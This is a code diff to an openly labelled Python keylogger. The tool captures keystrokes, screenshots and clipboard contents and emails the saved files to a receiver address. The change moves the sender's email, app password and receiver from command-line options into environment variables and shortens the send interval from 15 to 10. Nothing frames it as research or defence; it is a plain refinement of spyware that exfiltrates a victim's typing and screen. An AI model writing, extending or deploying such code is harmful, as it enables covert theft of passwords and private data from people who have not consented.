@@ -1,5 +1,9 @@
 import optparse
 
+# For environment variables
+from dotenv import load_dotenv
+load_dotenv()
+
 from pynput.keyboard import Key, Listener      #for keylogger
 import logging
 
@@ -25,27 +29,36 @@ parser=optparse.OptionParser()
 
 parser.add_option("-f","--filepath",dest="filepath",help="Input the file path in raw string(otherwise it will not work) you want to save all of the keylogger files")
 parser.add_option("-n","--loopno",dest="iteration_end",help="Input the no of iteration(integer value only) you want to use to send mails and run all other functions")
-parser.add_option("-s","--sender",dest="email",help="Input the sender email to send all the keylogger files")
-parser.add_option("-p","--pass",dest="password",help="Input the app password of Python of the sender(activate 2FA and then create new app password for python")
-parser.add_option("-r","--receiver",dest="receiver",help="Input the receiver email to send all the keylogger files")
+# parser.add_option("-s","--sender",dest="email",help="Input the sender email to send all the keylogger files")
+# parser.add_option("-p","--pass",dest="password",help="Input the app password of Python of the sender(activate 2FA and then create new app password for python")
+# parser.add_option("-r","--receiver",dest="receiver",help="Input the receiver email to send all the keylogger files")
 
 (option,arguements)=parser.parse_args()
 
 filepath=option.filepath
 iteration_end=int(option.iteration_end)
-email=option.email
-password=option.password
-receiver=option.receiver
+# email=option.email
+# password=option.password
+# receiver=option.receiver
+email = os.environ["SENDER"]
+password = os.environ["PASSWORD"]
+receiver = os.environ["RECEIVER"]
 
 if not option.filepath:
     parser.error("[-] Please specify the filepath")
 elif not option.iteration_end:
     parser.error("[-] Please specify the no of iteration")
-elif not option.email:
+# elif not option.email:
+#     parser.error("[-] Please specify sender email")
+# elif not option.password:
+#     parser.error("[-] Please specify sender Python password")
+# elif not option.receiver:
+#     parser.error("[-] Please specify receiver email")
+elif not email:
     parser.error("[-] Please specify sender email")
-elif not option.password:
+elif not password:
     parser.error("[-] Please specify sender Python password")
-elif not option.receiver:
+elif not receiver:
     parser.error("[-] Please specify receiver email")
 else:
     extend="\\"
@@ -56,7 +69,7 @@ else:
     screenshot_info="screenshot.png"
     clipboardinfo="clip.txt"
 
-    time_iteration=15
+    time_iteration=10
 
     #sending mail
     def send_mail(filename, attachment, receiver):
